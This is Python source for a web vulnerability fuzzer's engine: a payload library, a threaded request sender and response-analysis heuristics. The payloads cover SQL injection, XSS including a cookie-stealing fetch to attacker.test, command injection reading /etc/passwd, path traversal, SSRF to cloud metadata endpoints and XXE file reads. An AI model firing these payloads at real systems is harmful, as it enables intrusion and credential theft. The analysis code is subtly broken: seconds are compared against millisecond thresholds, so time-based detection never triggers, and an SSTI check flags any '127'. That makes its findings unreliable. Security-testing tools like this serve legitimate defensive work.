"""
Fuzzer core engine: payload library, request sender, and response analysis.
Runs fully in Python standard library + `requests`.
"""

import random
import re
import threading
import time

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

APP_VERSION = "1.0.0"

SEVERITY_ORDER = {
    "high": 0,
    "medium": 1,
    "low": 2,
    "info": 3,
    "ok": 4,
}

SEVERITY_LABELS = {
    "high": "High",
    "medium": "Medium",
    "low": "Low",
    "info": "Info",
    "ok": "OK",
}

# ---------------------------------------------------------------------------
# Payload library
# ---------------------------------------------------------------------------

# Signatures used to spot backend error leakage.
SQL_ERROR_SIGNATURES = [
    r"SQL syntax",
    r"Unclosed quotation mark",
    r"mysql_fetch",
    r"ORA-\d{5}",
    r"PostgreSQL",
    r"pg_query",
    r"Microsoft OLE DB",
    r"SqlException",
    r"SQLState",
    r"Syntax error.*near",
    r"at line \d+",
    r"SQLite3",
    r"OperationalError",
    r"Data truncated",
    r"near \"",
]

GENERIC_ERROR_SIGNATURES = [
    r"Stack trace",
    r"Traceback",
    r"Exception",
    r"Undefined variable",
    r"Warning:",
    r"Fatal error",
    r"java\.lang\.",
    r"at\s+\w+\.\w+\([^)]*\.java:",
    r"Internal Server Error",
    r"HTTP Status \d+",
    r"Whitelabel Error Page",
    r"RuntimeError",
    r"NameError",
    r"TypeError",
    r"\b500\b",
]

PAYLOADS = {
    "sql": {
        "name": "SQL Injection",
        "icon": "database",
        "description": "Payloads that probe for database query injection "
                       "and backend SQL error disclosure.",
        "severity": "high",
        "payloads": [
            ("""' OR '1'='1""", "boolean"),
            ('''" OR "1"="1''', "boolean"),
            ("""' OR 1=1--""", "boolean"),
            ("""' OR 1=1#""", "boolean"),
            ("""1' OR '1'='1' --""", "boolean"),
            ("""' UNION SELECT NULL--""", "blind"),
            ("""' UNION SELECT NULL,NULL,NULL--""", "blind"),
            ("""' AND SLEEP(5)--""", "time"),
            ("""' AND 1=1; WAITFOR DELAY '0:0:5'--""", "time"),
            ("""pg_sleep(5)--""", "time"),
            ("""'; SELECT pg_sleep(5);--""", "time"),
            ("""' AND 1=CONVERT(int, @@version)--""", "error"),
            ("""1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(0x7e,version(),0x7e) FROM information_schema.tables)""", "error"),
            (""")' OR (SELECT extractvalue(1,concat(0x7e,version())))--""", "error"),
            ("""' OR '1' LIKE '%1'""", "boolean"),
            ("""1/**/OR/**/1=1""", "bypass"),
            ("""1%27%27%20AND%20%271%27=%271""", "url_encoded"),
            ("""1' OR '1'='1' /*""", "comment"),
        ],
        "hint_payloads": ["' OR '1'='1", "' AND SLEEP(5)--"],
    },
    "xss": {
        "name": "Cross-Site Scripting",
        "icon": "code",
        "description": "Reflected / stored XSS payloads that look for "
                       "unsanitized echo-back of user input.",
        "severity": "medium",
        "payloads": [
            ("""><script>alert(1)</script>""", "reflected"),
            ("""<script>alert(document.cookie)</script>""", "reflected"),
            ("""<img src=x onerror=alert(1)>""", "reflected"),
            ("""<svg/onload=alert(1)>""", "reflected"),
            ("""javascript:alert(1)""", "reflected"),
            ("""<body onload=alert(1)>""", "reflected"),
            ("""<iframe srcdoc="<script>alert(1)</script>">""", "reflected"),
            ("""<script>fetch('//attacker.test/?c='+document.cookie)</script>""", "reflected"),
            ("""<details open ontoggle=alert(1)>""", "reflected"),
            ("""<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>""", "mutation"),
            ("""<script>alert(1);//</script>""", "reflected"),
            ('";alert(1);/"', "reflected"),
            ("""<scr<script>ipt>alert(1)</scr</script>ipt>""", "mutation"),
            ("""<script src=//attacker.test/x.js></script>""", "external"),
            ("""<a href='javascript:alert(1)'>click</a>""", "attribute"),
            ("""'><script>alert(1)</script>""", "context_break"),
        ],
        "hint_payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
    },
    "cmd": {
        "name": "Command Injection",
        "icon": "terminal",
        "description": "OS command execution probes that use separators, "
                       "time delays and output redirection.",
        "severity": "high",
        "payloads": [
            ("""; whoami""", "reflect"),
            ("""| whoami""", "reflect"),
            ("""&& whoami""", "reflect"),
            ("""`whoami`""", "reflect"),
            ("$(whoami)", "reflect"),
            ("""; ping -c 5 127.0.0.1""", "time"),
            ("""| ping -n 5 127.0.0.1""", "time"),
            ("""; echo ECHOED_PAYLOAD""", "reflect"),
            ("| echo ECHOED_PAYLOAD", "reflect"),
            ("""%0a whoami""", "newline"),
            ("`ping -c 5 127.0.0.1`", "time"),
            ("""$(ping -c 5 127.0.0.1)""", "time"),
            ("&& ping -c 3 127.0.0.1 && whoami", "time"),
            ("""'; cat /etc/passwd #""", "reflect"),
        ],
        "hint_payloads": ["; whoami", "| ping -c 5 127.0.0.1"],
    },
    "traversal": {
        "name": "Path Traversal",
        "icon": "folder",
        "description": "Payloads that try to escape the web root and read "
                       "arbitrary files (LFI/FI).",
        "severity": "high",
        "payloads": [
            ("""../../../../../../etc/passwd""", "file"),
            ("""..\\..\\..\\..\\windows\\win.ini""", "file"),
            ("""....//....//....//etc/passwd""", "bypass"),
            ("""..%2f..%2f..%2fetc%2fpasswd""", "encoded"),
            ("""..%252f..%252f..%252fetc%252fpasswd""", "double_encoded"),
            ("""..;/..;/..;/etc/passwd""", "bypass"),
            ("""..%c0%af..%c0%afetc%c0%afpasswd""", "unicode"),
            ("""/etc/passwd""", "absolute"),
            ("""..%5c..%5c..%5c..%5cetc%5cpasswd""", "encoded"),
            ("""%2e%2e%2f%2e%2e%2fetc%2fpasswd""", "double_encoded"),
            ("""..%2525252f..%2525252fetc%2525252fpasswd""", "multi_encoded"),
        ],
        "hint_payloads": ["../../../../../../etc/passwd", "..\\..\\..\\windows\\win.ini"],
    },
    "ldap": {
        "name": "LDAP Injection",
        "icon": "users",
        "description": "Payloads targeting LDAP search filters used by "
                       "authentication and directory lookup portals.",
        "severity": "medium",
        "payloads": [
            ("""*)(&""", "filter"),
            ("""*()|&""", "filter"),
            ("""*)(uid=*))(|(uid=*""", "filter"),
            ("""*)(|(cn=*""", "filter"),
            ("""))(cn=""", "filter"),
            ("""*)(|(mail=*""", "filter"),
            ("""admin*)((|userPassword=*""", "filter"),
        ],
        "hint_payloads": ["*)(&", "*)(uid=*))(|(uid=*"],
    },
    "template": {
        "name": "Server-Side Template Injection",
        "icon": "layout",
        "description": "SSTI probes for Jinja2 / Twig / Velocity style "
                       "expression evaluation (3 * 7 arithmetic checks).",
        "severity": "high",
        "payloads": [
            ("{{7*7}}", "arithmetic"),
            ("${7*7}", "arithmetic"),
            ("#{7*7}", "arithmetic"),
            ("""{{7*'7'}}""", "arithmetic"),
            ("${" + "7*7" + "}", "arithmetic"),
            ("""{{config}}""", "leak"),
            ("""{{''.__class__.__mro__[1].__subclasses__()}}""", "rce"),
            ("""${7*7}""", "arithmetic"),
            ("""<%= 7*7 %>""", "arithmetic"),
            ("""{% if 1 %}7*7=49{% endif %}""", "logic"),
            ("""{{"7"*7}}""", "arithmetic"),
        ],
        "hint_payloads": ["{{7*7}}", "${7*7}"],
    },
    "ssrf": {
        "name": "Server-Side Request Forgery",
        "icon": "globe",
        "description": "Payloads that make the server fetch internal "
                       "resources (metadata endpoints, localhost).",
        "severity": "high",
        "payloads": [
            ("http://127.0.0.1/", "internal"),
            ("http://169.254.169.254/latest/meta-data/", "cloud"),
            ("http://localhost/", "internal"),
            ("http://[::1]/", "internal"),
            ("http://0.0.0.0/", "internal"),
            ("file:///etc/passwd", "file"),
            ("gopher://127.0.0.1:80/_", "gopher"),
            ("dict://127.0.0.1:11211/info", "dict"),
            ("http://169.254.169.254/computeMetadata/v1/", "cloud"),
        ],
        "hint_payloads": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1/"],
    },
    "xml": {
        "name": "XXE / XML",
        "icon": "file",
        "description": "XML External Entity payloads for SOAP / XML-RPC "
                       "and other XML accepting endpoints.",
        "severity": "high",
        "payloads": [
            ("""<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>""", "file"),
            ("""<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "http://169.254.169.254/latest/meta-data/">]><x>&e;</x>""", "ssrf"),
            ("""<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://localhost/">]><r>&xxe;</r>""", "ssrf"),
            ("""<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///c:/windows/win.ini">]><x>&e;</x>""", "file"),
        ],
        "hint_payloads": ['<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>'],
    },
    "redir": {
        "name": "Open Redirect",
        "icon": "target",
        "description": "Redirect payloads probing for unvalidated "
                       "destination handling on redirect endpoints.",
        "severity": "low",
        "payloads": [
            ("//attacker.test", "protocol_relative"),
            ("https://attacker.test", "absolute"),
            ("/\\attacker.test", "backslash"),
            ("//attacker.test/", "protocol_relative"),
            ("javascript:alert(1)", "javascript"),
            ("/%5c%5cattacker.test", "encoded"),
        ],
        "hint_payloads": ["//attacker.test", "https://attacker.test"],
    },
    "format": {
        "name": "Format String",
        "icon": "percent",
        "description": "Format string probes for C / Java style "
                       "print-style processing of user input.",
        "severity": "medium",
        "payloads": [
            ("%s" * 20, "crash"),
            ("%x" * 20, "crash"),
            ("%n" * 5, "crash"),
            ("%p" * 10, "crash"),
            ("""%d %s %x %p""", "crash"),
        ],
        "hint_payloads": ["%s%s%s%s%s%s%s%s", "%n%n%n"],
    },
    "jwt": {
        "name": "JWT / Auth Tampering",
        "icon": "key",
        "description": "Auth-related tampering probes including "
                       "algorithm confusion and role escalation.",
        "severity": "medium",
        "payloads": [
            ("""admin""", "role"),
            ("""{"role":"admin"}""", "role"),
            ("""eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.""", "jwt_none"),
            ("""none""", "jwt"),
        ],
        "hint_payloads": ["""{"role":"admin"}""", "eyJhbGciOiJub25lIn0.e30."],
    },
}


def find_signatures(body, patterns):
    found = []
    for pat in patterns:
        m = re.search(pat, body, re.IGNORECASE | re.DOTALL | re.MULTILINE)
        if m:
            snippet = m.group(0).strip()
            if len(snippet) > 120:
                snippet = snippet[:120]
            if snippet not in found:
                found.append(snippet)
    return found


def look_for_reflection(body, payload, mode):
    """Check whether the payload (or a tell-tale portion) is echoed back."""
    if mode in ("time", "blind"):
        return None
    candidates = [payload]
    stripped = payload.replace("'", "").replace('"', "").replace("`", "")
    if stripped and stripped != payload and len(stripped) >= 4:
        candidates.append(stripped)
    for probe in payload.split(" "):
        if len(probe) >= 4 and probe not in candidates:
            candidates.append(probe)
    for cand in candidates:
        if cand and cand in body:
            return True
    return False


def analyze_response(payload, mode, response, start, elapsed, baseline_elapsed):
    result = {
        "status": response.status_code,
        "elapsed_ms": round(elapsed * 1000, 1),
        "length": len(response.content),
        "severity": "ok",
        "title": "No anomaly detected",
        "risk": 0,
        "details": [],
        "matched": [],
        "reflected": False,
    }

    content_type = response.headers.get("Content-Type", "")
    if "html" not in content_type and "text" not in content_type and "json" not in content_type:
        # binary / redirect — still scan text
        pass
    body = response.text

    risk = 0
    details = []
    matched = []

    # 1. Reflection
    reflection = False
    if body:
        reflection = look_for_reflection(body, payload, mode)
        result["reflected"] = bool(reflection)

    # 2. Time based
    time_ratio = 1.0
    if baseline_elapsed and baseline_elapsed > 0:
        time_ratio = elapsed / baseline_elapsed
    if elapsed > 5000 and mode == "time" and (time_ratio >= 4 or baseline_elapsed is None):
        risk = max(risk, 9)
        matched.append("time_delay")
        details.append("Response time %.1fs implies a possible time-based injection." % elapsed)
    elif elapsed > 2000 and mode == "time":
        risk = max(risk, 4)
        matched.append("delayed")
        details.append("Response was slower than expected (%.1fs)." % elapsed)

    # 3. SQL / generic error signatures
    if body and len(body) < 500000:
        sql_hits = find_signatures(body, SQL_ERROR_SIGNATURES)
        if sql_hits:
            risk = max(risk, 8)
            matched.append("sql_error")
            for s in sql_hits[:3]:
                details.append("SQL error signature: %r" % s)
        gen_hits = find_signatures(body, GENERIC_ERROR_SIGNATURES)
        if gen_hits:
            risk = max(risk, 6)
            matched.append("error_leak")
            for s in gen_hits[:3]:
                details.append("Exception/error leak: %r" % s)

    # 4. Semantic checks depending on payload type
    if mode == "error" and response.status_code >= 500:
        risk = max(risk, 7)
        matched.append("server_error")
        details.append("Server returned HTTP %d for an error-based probe."
                       % response.status_code)

    if mode == "arithmetic":
        if "49" in body or "7*7" in body and "49" in body:
            risk = max(risk, 9)
            matched.append("ssti")
            details.append("Arithmetic expression evaluated server-side ({{7*7}} -> 49).")
        elif "127" in body.replace(" ", ""):
            risk = max(risk, 7)
            matched.append("ssti")
            details.append("Suspicious consecutive digits suggest template evaluation.")

    if mode == "file" and (
        "root:" in body or "[extensions]" in body or "; for 16-bit app support" in body
        or "daemon:" in body or "nobody:" in body
    ):
        risk = max(risk, 9)
        matched.append("lfi")
        details.append("File content disclosure detected (looks like /etc/passwd or win.ini).")

    if mode == "reflect" and reflection:
        risk = max(risk, 7)
        matched.append("command_reflect")
        details.append("Command payload was echoed back uncompiled; verify command execution.")

    if mode == "filter" and response.status_code >= 400:
        risk = max(risk, 3)
        matched.append("ldap_error")
        details.append("Server errored on LDAP filter probe; may pass filters through.")

    if mode in ("internal", "cloud") and response.status_code == 200 and response.history:
        risk = max(risk, 5)
        matched.append("ssrf")
        details.append("Server followed redirect toward internal target: %s"
                       % (response.history and response.url or "unknown"))

    # 5. Status code changes
    if reflection:
        if mode in ("reflected", "context_break", "attribute", "external"):
            if risk < 6:
                risk = max(risk, 6)
                matched.append("xss_reflect")
                details.append("XSS payload reflected unencoded into the response body.")
        elif mode == "boolean":
            if risk < 4:
                risk = max(risk, 4)
                matched.append("sql_reflect")
                details.append("SQL probe echoed back; query values may be concatenated unsafely.")
        elif mode == "mutation":
            if risk < 4:
                risk = max(risk, 4)
                matched.append("reflected")
                details.append("Obfuscated payload returned unencoded.")

    if response.status_code >= 500:
        if risk < 5:
            risk = max(risk, 4)
            matched.append("server_error")
            details.append("HTTP %d — server-side error, possible crash or uncaught exception."
                           % response.status_code)

    if response.status_code == 400:
        if risk < 2:
            risk = max(risk, 1)
            details.append("HTTP 400 — input rejected (good validation).")

    # 6. Baseline comparison on status codes
    if baseline_elapsed is None:
        result["baseline"] = None
    else:
        result["baseline"] = round(baseline_elapsed * 1000, 1)

    result["risk"] = risk
    result["matched"] = matched
    result["details"] = details
    result["severity"] = risk_to_severity(risk)
    result["title"] = build_title(result, risk)
    return result


def risk_to_severity(risk):
    if risk >= 8:
        return "high"
    if risk >= 6:
        return "medium"
    if risk >= 2:
        return "low"
    return "ok"


def build_title(result, risk):
    if risk >= 8:
        return "Critical finding"
    if risk >= 6:
        return "High risk anomaly"
    if risk >= 2:
        return "Suspicious response"
    return "No anomaly detected"


# ---------------------------------------------------------------------------
# Fuzz runner (threaded)
# ---------------------------------------------------------------------------

class FuzzProgress:
    def __init__(self, total):
        self.lock = threading.Lock()
        self.total = total
        self.done = 0
        self.abort = False
        self.log = []

    def inc(self, n=1):
        with self.lock:
            self.done += n
            return self.done, self.total

    def add_log(self, line):
        with self.lock:
            self.log.append(line)


class Fuzzer:
    def __init__(self, config, progress=None):
        self.config = config
        self.progress = progress or FuzzProgress(0)
        self.results = []
        self.session = requests.Session()
        retry = Retry(total=0, backoff_factor=0, status_forcelist=[])
        adapter = HTTPAdapter(max_retries=retry, pool_connections=8, pool_maxsize=12)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        if config.get("user_agent"):
            self.session.headers["User-Agent"] = config["user_agent"]
        if config.get("cookies"):
            self.session.cookies.update(config["cookies"])

    # -- request building ------------------------------------------------
    def build_request(self, field, payload):
        method = self.config.get("method", "GET").upper()
        url = self.config["url"]
        params = dict(self.config.get("params", {}))
        data = dict(self.config.get("data", {}))
        headers = dict(self.config.get("headers", {}))
        json_body = None

        spot = self.config.get("fuzz_spots", [])
        inject_in_params = self.config.get("inject_params", True)
        inject_in_data = self.config.get("inject_data", True)
        inject_in_headers = self.config.get("inject_headers", False)

        in_header = False, ""
        if field in spot:
            in_header = True, field

        placed = False
        if in_header[0]:
            headers[field] = payload
            placed = True
        elif inject_in_params and field in params:
            params[field] = payload
            placed = True
        elif inject_in_data and field in data:
            data[field] = payload
            placed = True
        elif not in_header[0]:
            # Field wasn't part of the baseline request - auto-add it so the
            # user's "fields to fuzz" list is honoured even for new inputs.
            if inject_in_data and method in ("POST", "PUT", "PATCH"):
                data[field] = payload
                placed = True
            elif inject_in_params:
                params[field] = payload
                placed = True

        if not placed:
            return None

        kwargs = {"params": params, "headers": headers}
        if method in ("POST", "PUT", "PATCH"):
            if json_body:
                kwargs["json"] = json_body
            else:
                kwargs["data"] = data
        stripped = [k for k, v in headers.items() if k.lower() == "content-type"]
        return url, kwargs, method

    # -- send one request ------------------------------------------------
    def send(self, field, payload, mode, baseline_elapsed):
        built = self.build_request(field, payload)
        if built is None:
            return None
        url, kwargs, method = built
        timeout = self.config.get("timeout", 15)
        start = time.monotonic()
        try:
            resp = self.session.request(method, url, timeout=timeout, allow_redirects=True,
                                        verify=self.config.get("verify_ssl", True), **kwargs)
        except requests.exceptions.SSLError as exc:
            elapsed = time.monotonic() - start
            return {
                "status": 0, "elapsed_ms": round(elapsed * 1000, 1), "length": 0,
                "severity": "info", "title": "TLS error", "risk": 0, "details": [str(exc)[:200]],
                "matched": ["ssl"], "reflected": False, "baseline": round((baseline_elapsed or 0) * 1000, 1),
            }
        except requests.exceptions.Timeout as exc:
            elapsed = time.monotonic() - start
            return {
                "status": 0, "elapsed_ms": round(elapsed * 1000, 1), "length": 0,
                "severity": "medium", "title": "Request timeout", "risk": 5, "details": ["Request timed out after %.1fs." % elapsed],
                "matched": ["timeout"], "reflected": False, "baseline": round((baseline_elapsed or 0) * 1000, 1),
            }
        except requests.exceptions.ConnectionError as exc:
            elapsed = time.monotonic() - start
            return {
                "status": 0, "elapsed_ms": round(elapsed * 1000, 1), "length": 0,
                "severity": "info", "title": "Connection error", "risk": 0, "details": [str(exc)[:200]],
                "matched": ["conn"], "reflected": False, "baseline": round((baseline_elapsed or 0) * 1000, 1),
            }
        except Exception as exc:  # noqa: BLE001
            elapsed = time.monotonic() - start
            return {
                "status": 0, "elapsed_ms": round(elapsed * 1000, 1), "length": 0,
                "severity": "info", "title": "Error", "risk": 0, "details": [str(exc)[:200]],
                "matched": ["error"], "reflected": False, "baseline": round((baseline_elapsed or 0) * 1000, 1),
            }
        elapsed = time.monotonic() - start
        return analyze_response(payload, mode, resp, start, elapsed, baseline_elapsed)

    # -- driver ------------------------------------------------------------
    def run(self, cancel_event=None):
        config = self.config
        fields = config["fields"]
        categories = config["categories"]
        baseline_elapsed = config.get("baseline_elapsed")

        # baseline request
        if baseline_elapsed is None and config.get("use_baseline", True):
            t0 = time.monotonic()
            self.send("baseline", "", "", None)
            baseline_elapsed = time.monotonic() - t0
            self.progress.add_log("Baseline response established (%.2fs)." % baseline_elapsed)

        jobs = []
        for cat in categories:
            if cat not in PAYLOADS:
                continue
            group = PAYLOADS[cat]
            for payload, mode in group["payloads"]:
                for field in fields:
                    jobs.append((field, cat, payload, mode))

        self.progress.total = len(jobs)
        self.progress.add_log("Queued %d requests across %d field(s) and %d payload category(ies)."
                              % (len(jobs), len(fields), len(categories)))

        if config.get("shuffle", False):
            random.shuffle(jobs)

        delay = config.get("delay", 0.0)
        threads = max(1, min(int(config.get("threads", 4)), 12))

        lock = threading.Lock()
        results = []

        def worker():
            while True:
                if (cancel_event and cancel_event.is_set()) or self.progress.abort:
                    return
                with lock:
                    if not jobs:
                        return
                    job = jobs.pop(0)
                field, cat, payload, mode = job
                res = self.send(field, payload, mode, baseline_elapsed)
                if res is None:
                    self.progress.inc()
                    continue
                entry = {
                    "field": field,
                    "category": cat,
                    "category_name": PAYLOADS[cat]["name"],
                    "payload": payload,
                    "mode": mode,
                    **res,
                }
                with lock:
                    results.append(entry)
                self.progress.inc()
                if delay:
                    time.sleep(delay)

        pool = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
        for t in pool:
            t.start()
        for t in pool:
            t.join()

        results.sort(key=lambda r: (SEVERITY_ORDER.get(r["severity"], 9),
                                    r["category"], r["field"]))
        self.results = results
        self.progress.add_log("Scan finished: %d findings recorded." % len(results))
        return results


# ---------------------------------------------------------------------------
# Reporting helpers
# ---------------------------------------------------------------------------

def build_summary(results, target):
    counts = {"high": 0, "medium": 0, "low": 0, "info": 0, "ok": 0, "total": 0}
    for r in results:
        counts[r.get("severity", "ok")] = counts.get(r.get("severity", "ok"), 0) + 1
        counts["total"] += 1
    score = counts["high"] * 3 + counts["medium"] * 2 + counts["low"]
    if counts["total"] == 0:
        grade = "N/A"
    elif score == 0:
        grade = "A+"
    elif score <= counts["total"] * 1:
        grade = "A"
    elif score <= counts["total"] * 2:
        grade = "B"
    elif score <= counts["total"] * 3:
        grade = "C"
    else:
        grade = "D"
    return counts, score, grade